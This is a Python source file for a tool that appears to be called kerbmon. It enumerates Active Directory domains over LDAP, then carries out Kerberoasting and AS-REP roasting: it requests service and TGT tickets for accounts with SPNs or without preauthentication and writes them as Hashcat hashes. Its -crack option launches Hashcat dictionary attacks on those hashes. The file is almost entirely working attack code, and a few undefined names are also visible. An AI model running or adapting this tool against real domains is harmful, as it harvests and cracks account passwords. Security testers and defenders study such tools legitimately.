#!/usr/bin/env python
#
# Author:
#  @__Retrospect
#  https://github.com/Retrospected/kerbmon/

import argparse
import sys
import os
import logging
import sqlite3
import datetime
import random
from binascii import hexlify, unhexlify
import subprocess

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from impacket import version
from impacket.ldap import ldap, ldapasn1
from impacket.krb5.asn1 import TGS_REP, AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.ccache import CCache
from impacket.krb5 import constants
from impacket.examples.utils import parse_credentials
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION, UF_DONT_REQUIRE_PREAUTH
from impacket.ntlm import compute_lmhash, compute_nthash


class Database:
    def __init__(self,db_file):
        self.db_file=db_file

    def connect_database(self):
        self.conn = sqlite3.connect(self.db_file)
        self.cursor = self.conn.cursor()

    def create_database(self):
        self.connect_database()

        sql_spn_table = """ CREATE TABLE IF NOT EXISTS spn (
                                        id integer PRIMARY KEY AUTOINCREMENT,
                                        domain text NOT NULL,
                                        servicePrincipalName text NOT NULL,
                                        sAMAccountName text NOT NULL,
                                        pwdLastSetDate text NOT NULL
                                    ); """

        sql_np_table = """ CREATE TABLE IF NOT EXISTS np (
                                        id integer PRIMARY KEY AUTOINCREMENT,
                                        domain text NOT NULL,
                                        sAMAccountName text NOT NULL,
                                        pwdLastSetDate text NOT NULL
                                    ); """


        if self.cursor is not None:
            self.create_table(sql_spn_table)
            self.create_table(sql_np_table)

    def commit(self):
        self.conn.commit()

    def create_table(self, create_table_sql):
        """ create a table from the create_table_sql statement
        :param conn: Connection object
        :param create_table_sql: a CREATE TABLE statement
        :return:
        """
        try:
            self.cursor.execute(create_table_sql)
        except Error as e:
            logger.info(e)

    def find_np(self, domain, np):
        samaccountname = np[0]
        pwdlastsetDate = np[2].split(' ')[0]

        npFound = True

        cursor = self.cursor
        npQuery = """SELECT pwdLastSetDate FROM np WHERE samaccountname = ? AND domain = ?"""
        npResult = cursor.execute(npQuery, (samaccountname, domain, )).fetchall()

        if len(npResult) == 0:
            logger.info("        ** NEW NP FOUND! Domain: "+domain+" sAMAccountName: "+samaccountname+", pulling the TGT.")
            npFound=False
            logger.info("        ** Adding the NP to the database.")
            cursor.execute("INSERT INTO np (domain, sAMAccountName, pwdLastSetDate) VALUES (?,?,?)", (domain, samaccountname, pwdlastsetDate))
        elif len(npResult) == 1:
            if pwdlastsetDate != npResult[0][0]:
                logger.info("        ** CHANGED PW FOUND! Domain: "+domain+" sAMAccountName: "+samaccountname+" old pwdlastsetDate value: "+npResult[0][0]+ " new pwdlastsetDate value: "+pwdlastsetDate)
                cursor.execute("UPDATE np SET pwdLastSetDate=? WHERE sAMAccountName=?",(pwdlastsetDate, samaccountname))
                npFound=False
        else:
            logger.info("        ** huh, more than 1 database match, something wrong here:")
            logger.info("        ** domain: "+domain+" samaccountname "+ samaccountname + " pwdlastsetDate: " + pwdlastsetDate)
            raise

        self.commit()
        return npFound

    def find_spn(self, domain, spn, samaccountname, pwdlastset):
        pwdlastsetDate = pwdlastset.split(' ')[0]

        results=[]

        cursor = self.cursor
        spnQuery = """SELECT pwdLastSetDate FROM spn WHERE servicePrincipalName = ? AND samaccountname = ? AND domain = ?"""
        spnResult = cursor.execute(spnQuery, (spn,samaccountname,domain,)).fetchall()

        if len(spnResult) == 0:
            logger.info("        ** NEW SPN FOUND! Domain: "+domain+" SPN: "+spn+" sAMAccountName: "+samaccountname)

            samQuery = """SELECT * FROM spn WHERE samaccountname= ? AND domain= ?"""
            samResult = cursor.execute(samQuery, (samaccountname, domain, )).fetchall()
            if len(samResult) == 0:
                logger.info("        ** SAMAccount did not have a SPN registered yet, so going to pull the TGS.")
                results.append(spn)
                results.append(samaccountname)
            else:
                logger.info("        ** SAMAccount already had a SPN registered, so not going to pull the TGS.")

            logger.info("        ** Adding the SPN to the database.")
            cursor.execute("INSERT INTO spn (domain, servicePrincipalName, sAMAccountName, pwdLastSetDate) VALUES (?,?,?,?)", (domain, spn, samaccountname, pwdlastsetDate))
        elif len(spnResult) == 1:
            if pwdlastsetDate != spnResult[0][0]:
                logger.info("        ** CHANGED PW FOUND! Domain: "+domain+" SPN: "+spn+" sAMAccountName: "+samaccountname+" old pwdlastsetDate value: "+spnResult[0][0]+ " new pwdlastsetDate value: "+pwdlastsetDate)
                cursor.execute("UPDATE spn SET pwdLastSetDate=? WHERE sAMAccountName=?",(pwdlastsetDate, samaccountname))
                results.append(spn)
                results.append(samaccountname)
        else:
            logger.info("        ** huh, more than 1 database match, something wrong here:")
            logger.info("        ** domain: "+domain+" spn: "+ spn + " samaccountname "+ samaccountname + " pwdlastsetDate: " + pwdlastsetDate)
            raise

        self.commit()
        return results


class Roaster:

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__outputFileName = cmdLineOptions.outputfile
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGS = cmdLineOptions.request
        self.__kdcHost = cmdLineOptions.dc_ip
        self.__saveTGS = cmdLineOptions.save
        self.__requestUser = cmdLineOptions.request_user
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__targetDomain.split('.')
        self.__baseDN = ''
        for i in domainParts:
            self.__baseDN += 'dc=%s,' % i
        # Remove last ','
        self.__baseDN = self.__baseDN[:-1]
        # We can't set the KDC to a custom IP when requesting things cross-domain
        # because then the KDC host will be used for both
        # the initial and the referral ticket, which breaks stuff.
        if user_domain != target_domain and self.__kdcHost:
            logger.info('DC ip will be ignored because of cross-domain targeting.')
            self.__kdcHost = None


    def getMachineName(self):
        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            s = SMBConnection(self.__kdcHost, self.__kdcHost)
        else:
            s = SMBConnection(self.__targetDomain, self.__targetDomain)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise 'Error while anonymous logging into %s'
        else:
            try:
                s.logoff()
            except Exception:
                # We don't care about exceptions here as we already have the required
                # information. This also works around the current SMB3 bug
                pass
        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT_ASREP(self, userName, requestPAC=True):

        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.__targetDomain.upper()

        logger.info("     ** Getting the krb5asrep ticket of user: "+userName+" from domain: "+domain)

        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.__kdcHost)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.__kdcHost)
            else:
                raise e

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)

        # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
        self.writeASREP(self.__outputFileName,'$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))


    def harvesterNPs(self):
        if self.__usersFile:
            self.request_users_file_TGTs()
            return

        if self.__doKerberos:
            target = self.getMachineName()
        else:
            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                target = self.__kdcHost
            else:
                target = self.__targetDomain

        logger.info("    ** Connecting to LDAP")
        logger.debug("To LDAP server: "+target)
        logger.debug("With BaseDN: "+self.__baseDN)
        logger.debug("To KDC host: "+str(self.__kdcHost))
        logger.debug("With auth domain: "+self.__domain)
        logger.debug("And auth user: "+self.__username)

        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.__baseDN, self.__kdcHost)
            ldapConnection.login(self.__username, self.__password, self.__domain)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.__baseDN, self.__kdcHost)
                ldapConnection.login(self.__username, self.__password, self.__domain)
            elif str(e).find('invalidCredentials') >= 0:
                logger.info("   ** Invalid credentials to connect to LDAP")
                return []
            else:
                raise
        except:
            logger.info("   ** Unable to connect to LDAP")
            return []


        # Building the search filter
        searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
                       (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)

        logger.info("    ** Searching LDAP for ASREP Roastable accounts")
        self.answersNPs = []

        try:
            sc = ldap.SimplePagedResultsControl(size=1000)
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                                     sizeLimit=0, searchControls = [sc], perRecordCallback=self.processRecordNP)
        except ldap.LDAPSearchError as e:
            logger.info(e.getErrorString())
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                pass
            else:
                raise

        return self.answersNPs

    def processRecordNP(self, item):
        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
            return

        mustCommit = False
        sAMAccountName =  ''
        memberOf = ''
        pwdLastSet = ''
        userAccountControl = 0
        lastLogon = 'N/A'
        try:
            for attribute in item['attributes']:
                if str(attribute['type']) == 'sAMAccountName':
                    sAMAccountName = str(attribute['vals'][0])
                    mustCommit = True
                elif str(attribute['type']) == 'userAccountControl':
                    userAccountControl = "0x%x" % int(attribute['vals'][0])
                elif str(attribute['type']) == 'memberOf':
                    memberOf = str(attribute['vals'][0])
                elif str(attribute['type']) == 'pwdLastSet':
                    if str(attribute['vals'][0]) == '0':
                        pwdLastSet = '<never>'
                    else:
                        pwdLastSet = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                elif str(attribute['type']) == 'lastLogon':
                    if str(attribute['vals'][0]) == '0':
                        lastLogon = '<never>'
                    else:
                        lastLogon = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
            if mustCommit is True:
                self.answersNPs.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
        except Exception as e:
            logging.debug("Exception:", exc_info=True)
            logging.error('Skipping item, cannot process due to error %s' % str(e))
            pass

    def request_multiple_TGTs(self, usernames):
        for username in usernames:
            try:
                entry = self.getTGT_ASREP(username)
                self.resultsNPs.append(entry)
            except Exception as e:
                logging.error('%s' % str(e))

    def harvesterSPNs(self):

        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        if self.__doKerberos:
            target = self.getMachineName()
        else:
            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                target = self.__kdcHost
            else:
                target = self.__targetDomain

        logger.info("    ** Connecting to LDAP")
        logger.debug("To LDAP server: "+target)
        logger.debug("With BaseDN: "+self.__baseDN)
        logger.debug("To KDC host: "+str(self.__kdcHost))
        logger.debug("With auth domain: "+self.__domain)
        logger.debug("And auth user: "+self.__username)
        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.__baseDN, self.__kdcHost)
            ldapConnection.login(self.__username, self.__password, self.__domain)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.__baseDN, self.__kdcHost)
                ldapConnection.login(self.__username, self.__password, self.__domain)
            elif str(e).find('invalidCredentials') >= 0:
                logger.info("   ** Invalid credentials to connect to LDAP")
                return []
            else:
                raise
        except:
            logger.info("   ** Unable to connect to LDAP")
            return []

        filter_person = "objectCategory=person"
        filter_not_disabled = "!(userAccountControl:1.2.840.113556.1.4.803:=2)"

        searchFilter = "(&"
        searchFilter += "(" + filter_person + ")"
        searchFilter += "(" + filter_not_disabled + "))"

        logger.info("    ** Searching LDAP for SPNs")
        self.answersSPNs = []

        try:
            sc = ldap.SimplePagedResultsControl(size=1000)
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                                     sizeLimit=0, searchControls = [sc], perRecordCallback=self.processRecordSPN)
        except ldap.LDAPSearchError as e:
            logger.info(e.getErrorString())
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                pass
            else:
                raise

        return self.answersSPNs

    def processRecordSPN(self, item):
        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
            return

        mustCommit = False
        sAMAccountName =  ''
        memberOf = ''
        SPNs = []
        pwdLastSet = ''
        userAccountControl = 0
        lastLogon = 'N/A'
        delegation = ''
        try:
            for attribute in item['attributes']:
                if str(attribute['type']) == 'sAMAccountName':
                    sAMAccountName = str(attribute['vals'][0])
                    mustCommit = True
                elif str(attribute['type']) == 'userAccountControl':
                    userAccountControl = str(attribute['vals'][0])
                    if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                        delegation = 'unconstrained'
                    elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                        delegation = 'constrained'
                elif str(attribute['type']) == 'memberOf':
                    memberOf = str(attribute['vals'][0])
                elif str(attribute['type']) == 'pwdLastSet':
                    if str(attribute['vals'][0]) == '0':
                        pwdLastSet = '<never>'
                    else:
                        pwdLastSet = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                elif str(attribute['type']) == 'lastLogon':
                    if str(attribute['vals'][0]) == '0':
                        lastLogon = '<never>'
                    else:
                        lastLogon = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                elif str(attribute['type']) == 'servicePrincipalName':
                    for spn in attribute['vals']:
                        SPNs.append(str(spn))

            if mustCommit is True:
                if int(userAccountControl) & UF_ACCOUNTDISABLE:
                    pass
                else:
                    for spn in SPNs:
                        self.answersSPNs.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
        except Exception as e:
            logger.info('Skipping item, cannot process due to error %s' % str(e))
            pass


    def getTGT(self):
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except:
            # No cache present
            pass
        else:

            if ccache is not None:
                # retrieve user and domain information from CCache file if needed
                if self.__domain == '':
                    domain = ccache.principal.realm['data']
                else:
                    domain = self.__domain
                logger.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
                principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
                creds = ccache.getCredential(principal)
                if creds is not None:
                    TGT = creds.toTGT()
                    logger.debug('Using TGT from cache')
                    return TGT
                else:
                    logger.debug("No valid credentials found in cache. ")

        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                compute_lmhash(self.__password),
                                                                compute_nthash(self.__password), self.__aesKey,
                                                                kdcHost=self.__kdcHost)
            except Exception as e:
                logger.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash),
                                                                    unhexlify(self.__nthash), self.__aesKey,
                                                                    kdcHost=self.__kdcHost)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(self.__lmhash),
                                                                unhexlify(self.__nthash), self.__aesKey,
                                                                kdcHost=self.__kdcHost)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT

    def getTGS(self, answers):

        if self.__requestTGS is True or self.__requestUser is not None:
            # Let's get unique user names and a SPN to request a TGS for
            users = dict( (vals[1], vals[0]) for vals in answers)

            # Get a TGT for the current user
            TGT = self.getTGT()

            if self.__outputFileName is not None:
                fd = self.__outputFileName
            else:
                fd = None

            for user, SPN in users.items():

                logger.info("     ** Getting TGS from user: "+user+" with SPN: "+SPN)

                sAMAccountName = user
                downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName

                try:
                    principalName = Principal()
                    principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                    principalName.components = [downLevelLogonName]

                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                            self.__kdcHost,
                                                                            TGT['KDC_REP'], TGT['cipher'],
                                                                            TGT['sessionKey'])
                    self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.__targetDomain + "/" + sAMAccountName, fd)
                except Exception as e:
                    logger.debug("Exception:", exc_info=True)
                    logger.debug('Principal: %s - %s' % (downLevelLogonName, str(e)))

    def writeASREP(self, fd, asrep):
        writer = open(fd+"."+asrep.split('$')[2]+".krb5asrep", 'a')
        writer.write(asrep + '\n')
        writer.close()

    def writeTGS(self, fd, tgs):
        writer = open(fd+"."+tgs.split('$')[2]+".krb5tgs", 'a')
        writer.write(tgs + '\n')
        writer.close()


    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted
        # ticket
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                logger.info(entry)
            else:
                self.writeTGS(fd, entry)
                #fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                logger.info(entry)
            else:
                self.writeTGS(fd, entry)
                #fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                logger.info(entry)
            else:
                self.writeTGS(fd, entry)
                #fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                logger.info(entry)
            else:
                self.writeTGS(fd, entry)
                #fd.write(entry+'\n')
        else:
            logger.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

        if self.__saveTGS is True:
            # Save the ticket
            logger.debug('About to save TGS for %s' % username)
            ccache = CCache()
            try:
                ccache.fromTGS(tgs, oldSessionKey, sessionKey )
                ccache.saveFile('%s.ccache' % username)
            except Exception as e:
                logger.error(str(e))



if __name__ == "__main__":

    #required args: db file, creds, target-domain file, outputfile

    parser = argparse.ArgumentParser(add_help =  True, description = "Query domains for SPNs that are configured and for users that have the property 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH). Monitor for changes and pull latest TGT or TGS tickets.")
    parser.add_argument('-credentials', action='store', help='[required] domain/username[:password]', required=True)
    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                   '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                   'cannot be found, it will use the ones specified in the command '
                                                   'line')
    parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                        '(128 or 256 bits)')
    parser.add_argument('-domainsfile', help='[required] File with domains (FQDN) per line to test', required=True)
    parser.add_argument('-dbfile', help='[required] SQLite3 DB file to use as a database', required=True)
    parser.add_argument('-crack', action='store', metavar = "wordlist", help='Automatically attempt to crack the TGS service ticket(s) using a dictionary attack with the provided wordlist (using Hashcat)')
    parser.add_argument('-outputfile', action='store', help='Output file to write new or changed SPNs to. A date and timestamp will be appended to the filename as well as the encryption type ID of the TGS (23=rc4, 18=aes256, etc).')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    options = parser.parse_args()

    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    if options.aesKey is not None:
        options.k = True

    # enforcing default arguments
    options.dc_ip = None
    options.usersfile = None
    options.request = True
    options.save = False
    options.request_user = None
    options.hashes = None

    logger = logging.getLogger('logger')

    if options.crack is not None and options.outputfile is None:
        logger.info("Cannot use the crack option without outputting the results to files using the -outputfile option")
        exit()

    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    stdoutHandler = logging.StreamHandler(sys.stdout)
    logging.getLogger().addHandler(stdoutHandler)

    if options.debug is True:
        debugHandler = logging.FileHandler('debug_' + datetime.datetime.now().strftime('%Y-%m-%d_%H-%M') + '.log')
        debugHandler.setLevel(logging.DEBUG)
        debugHandler.setFormatter(formatter)
        logging.getLogger().addHandler(debugHandler)

        logger.setLevel(logging.DEBUG)
        logger.debug(version.getInstallationPath())
    else:
        logger.setLevel(logging.INFO)

    authDomain, username, password = parse_credentials(options.credentials)
    db = Database(options.dbfile)

    try:
        logger.info("Authenticating with domain: "+authDomain)
        logger.info("With username: "+username)
        logger.info("Loading domains from file: "+options.domainsfile)
        logger.info("Storing state in: "+options.dbfile)

        if options.outputfile is not None:
            options.outputfile = options.outputfile + "_" + datetime.datetime.now().strftime('%Y-%m-%d_%H-%M')
            logger.info("Outputting results in: "+options.outputfile)

        if not os.path.exists(options.dbfile):
            logger.info("*** DATABASE NOT FOUND")
            db.create_database()
            logger.info("*** DATABASE CREATED")
        else:
            logger.info("*** DATABASE FOUND")
            db.connect_database()

        with open(options.domainsfile) as fi:
            domains = [line.strip() for line in fi]

        for targetDomain in domains:
            logger.info(" ** Starting enumerating domain: "+targetDomain)

            roaster = Roaster(username, password, authDomain, targetDomain, options)

            # KERBEROAST

            spnAnswers = roaster.harvesterSPNs()
            tgsList = []
            for spn in spnAnswers:
                logger.debug("Found SPN: "+spn[0])
                newSpn = db.find_spn(targetDomain, spn[0], spn[1], spn[3])
                if newSpn:
                    tgsList.append(newSpn)

            if len(tgsList)>0:
                roaster.getTGS(tgsList)
                if options.outputfile is not None:
                    logger.info("    ** Results written to: "+options.outputfile+".XX.krb5tgs, where XX is the encryption type id of the ticket.")
            else:
                logger.info("    ** No new or changed SPNs found for domain: "+targetDomain)

            # ASREP ROAST
            npAnswers = roaster.harvesterNPs()
            npsList = []
            for np in npAnswers:
                logger.debug("Found NP with sAMAccountName: "+np[0])
                npFound = db.find_np(targetDomain, np)
                if not npFound:
                    npsList.append(np)

            if len(npsList)>0:
                usernames = [answer[0] for answer in npsList]
                roaster.request_multiple_TGTs(usernames)
                if options.outputfile is not None:
                    logger.info("    ** Results written to: "+options.outputfile+".XX.krb5asrep, where XX is the encryption type id of the ticket.")
            else:
                logger.info("    ** No new or changed NPUsers found for domain: "+targetDomain)

            logger.info(" ** Finished enumerating domain: "+targetDomain)

        logger.info("Finished all domains")

        if options.crack is not None:
            if os.path.exists(options.outputfile+".23.krb5tgs"):
                logger.info("[KERBEROAST] Starting to crack RC4 TGS tickets using wordlist: "+options.crack)
                subprocess.run(["hashcat","-m13100","-a0",options.outputfile+".23.krb5tgs",options.crack,"--force"]).stdout
            if os.path.exists(options.outputfile+".17.krb5tgs"):
                logger.info("[KERBEROAST] Starting to crack AES128 encrypted TGS tickets using wordlist: "+options.crack)
                subprocess.run(["hashcat","-m19600","-a0",options.outputfile+".17.krb5tgs",options.crack,"--force"]).stdout
            if os.path.exists(options.outputfile+".18.krb5tgs"):
                logger.info("[KERBEROAST] Starting to crack AES256 encrypted TGS tickets using wordlist: "+options.crack)
                subprocess.run(["hashcat","-m19700","-a0",options.outputfile+".18.krb5tgs",options.crack,"--force"]).stdout
            if os.path.exists(options.outputfile+".23.krb5asrep"):
                logger.info("[ASREP-ROAST] Starting to crack RC4 encrypted TGT tickets using wordlist: "+options.crack)
                subprocess.run(["hashcat","-m18200","-a0",options.outputfile+".23.krb5asrep",options.crack,"--force"]).stdout

    except Exception as e:
        import traceback
        traceback.print_exc()
